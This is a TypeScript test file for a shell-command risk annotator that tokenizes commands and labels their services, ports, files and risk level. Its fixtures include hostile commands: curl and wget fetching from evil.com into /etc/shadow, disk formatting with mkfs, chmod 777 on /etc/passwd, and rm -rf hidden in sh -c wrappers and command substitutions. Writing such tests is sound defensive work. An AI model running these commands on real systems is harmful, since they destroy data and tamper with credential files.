import { test } from "node:test";
import assert from "node:assert/strict";
import {
  annotateCommandScope,
  annotateCommandsScope,
  commandScope,
  formatScopedDiff,
  tokenizeShellWords,
} from "./command-scope";

test("tokenizeShellWords handles quotes and whitespace accurately", () => {
  const tokens = tokenizeShellWords(`systemctl restart 'my service' --flag="val with spaces"`);
  assert.equal(tokens.length, 4);
  assert.equal(tokens[0].word, "systemctl");
  assert.equal(tokens[1].word, "restart");
  assert.equal(tokens[2].word, "my service");
  assert.equal(tokens[3].word, "--flag=val with spaces");
});

test("annotateCommandScope resolves systemctl service resources and ports", () => {
  const scope = annotateCommandScope("sudo systemctl restart nginx.service");
  assert.equal(scope.executable, "systemctl");
  assert.equal(scope.subcommand, "restart");
  assert.ok(scope.services.includes("nginx"));
  assert.ok(scope.ports.includes("80"));
  assert.ok(scope.ports.includes("443"));
  assert.ok(scope.sockets.includes("tcp/80"));
  assert.ok(scope.files.some((f) => f.includes("nginx")));
  assert.equal(scope.riskLevel, "medium");
});

test("annotateCommandScope flags destructive rm as critical", () => {
  const scope = annotateCommandScope("rm -rf /var/lib/data/*");
  assert.equal(scope.executable, "rm");
  assert.equal(scope.riskLevel, "critical");
  assert.ok(scope.files.includes("/var/lib/data/*"));
});

test("annotateCommandScope handles container commands", () => {
  const scope = annotateCommandScope("podman stop twin-a9");
  assert.equal(scope.executable, "podman");
  assert.equal(scope.subcommand, "stop");
  assert.equal(scope.riskLevel, "high");
  assert.ok(scope.sockets.includes("unix:/run/podman/podman.sock"));
});

test("formatScopedDiff formats diff blocks with resource annotations", () => {
  const diff = formatScopedDiff([
    "systemctl restart postgresql",
    "rm -rf /tmp/cache/*",
  ]);
  assert.ok(diff.includes("+ systemctl restart postgresql"));
  assert.ok(diff.includes("sockets:  tcp/5432"));
  assert.ok(diff.includes("ports:    5432"));
  assert.ok(diff.includes("+ rm -rf /tmp/cache/*"));
  assert.ok(diff.includes("[CRITICAL]"));
});

test("annotateCommandScope detects destructive statements in compound commands", () => {
  const compound = annotateCommandScope("echo ok; rm -rf /var/lib/app/*");
  assert.equal(compound.riskLevel, "critical");
  assert.ok(compound.files.includes("/var/lib/app/*"));

  const piped = annotateCommandScope("cat /etc/passwd | rm -f /tmp/test");
  assert.equal(piped.riskLevel, "high");
  assert.ok(piped.files.includes("/tmp/test"));
});

test("annotateCommandScope unwraps sh -c commands", () => {
  const shCmd = annotateCommandScope("sh -c 'rm -rf /tmp/data/*'");
  assert.equal(shCmd.riskLevel, "critical");
  assert.ok(shCmd.files.includes("/tmp/data/*"));
});

test("annotateCommandScope unwraps shell launcher options before -c (sh, bash, zsh, dash)", () => {
  // Option flags before -c
  const bashOpts = annotateCommandScope("bash -x -e -c 'rm -rf /etc/shadow'");
  assert.equal(bashOpts.executable, "rm");
  assert.equal(bashOpts.riskLevel, "critical");
  assert.ok(bashOpts.files.includes("/etc/shadow"));

  // Combined short option like -ec
  const bashCombined = annotateCommandScope("bash -ec 'systemctl stop nginx'");
  assert.equal(bashCombined.executable, "systemctl");
  assert.equal(bashCombined.riskLevel, "high");
  assert.ok(bashCombined.services.includes("nginx"));

  // zsh -lc
  const zshCombined = annotateCommandScope("zsh -lc 'rm -rf /var/log/*'");
  assert.equal(zshCombined.executable, "rm");
  assert.equal(zshCombined.riskLevel, "critical");

  // dash -c
  const dashCmd = annotateCommandScope("dash -c 'mkfs.ext4 /dev/sda'");
  assert.equal(dashCmd.executable, "mkfs.ext4");
  assert.equal(dashCmd.riskLevel, "critical");

  // sh -exc
  const shCombined = annotateCommandScope("sh -exc 'chmod 777 /etc/passwd'");
  assert.equal(shCombined.executable, "chmod");
  assert.equal(shCombined.riskLevel, "high");
  assert.ok(shCombined.files.includes("/etc/passwd"));
});

test("annotateCommandScope recognizes curl and wget --output=<path> as file write", () => {
  const curlOutput = annotateCommandScope("curl https://evil.com/payload --output=/etc/shadow");
  assert.equal(curlOutput.executable, "curl");
  assert.equal(curlOutput.riskLevel, "critical");
  assert.ok(curlOutput.files.includes("/etc/shadow"));

  const wgetOutput = annotateCommandScope("wget https://evil.com/payload --output-document=/etc/shadow");
  assert.equal(wgetOutput.executable, "wget");
  assert.equal(wgetOutput.riskLevel, "critical");
  assert.ok(wgetOutput.files.includes("/etc/shadow"));

  const curlNormal = annotateCommandScope("curl -o /tmp/download.tar.gz https://example.com/file");
  assert.equal(curlNormal.executable, "curl");
  assert.equal(curlNormal.riskLevel, "medium");
  assert.ok(curlNormal.files.includes("/tmp/download.tar.gz"));
});

test("annotateCommandScope flags mutating power commands", () => {
  const rebootScope = annotateCommandScope("reboot");
  assert.equal(rebootScope.riskLevel, "critical");

  const unknownScope = annotateCommandScope("custom_admin_tool --action fix");
  assert.equal(unknownScope.riskLevel, "medium");
  assert.ok(unknownScope.impactSummary.includes("Unknown command"));
  assert.equal(unknownScope.unknown, true);
});

test("annotateCommandScope detects command substitutions $(...) and `...`", () => {
  const sub = annotateCommandScope('echo "$(rm -rf /var/lib/app/*)"');
  assert.equal(sub.riskLevel, "critical");
  assert.ok(sub.files.includes("/var/lib/app/*"));

  const backtick = annotateCommandScope("echo `rm -rf /tmp/data`");
  assert.equal(backtick.riskLevel, "critical");
  assert.ok(backtick.files.includes("/tmp/data"));
});

test("annotateCommandScope handles descriptor redirections", () => {
  const redir = annotateCommandScope("cat non_existent 2>/etc/shadow");
  assert.equal(redir.riskLevel, "critical");
  assert.ok(redir.files.includes("/etc/shadow"));
});

test("commandScope returns one scope per statement for chained commands", () => {
  const scopes = commandScope("systemctl restart nginx; rm -rf /tmp/x");
  assert.equal(scopes.length, 2);
  assert.equal(scopes[0].executable, "systemctl");
  assert.ok(scopes[0].services.includes("nginx"));
  assert.equal(scopes[1].executable, "rm");
  assert.equal(scopes[1].risk, "high");
});
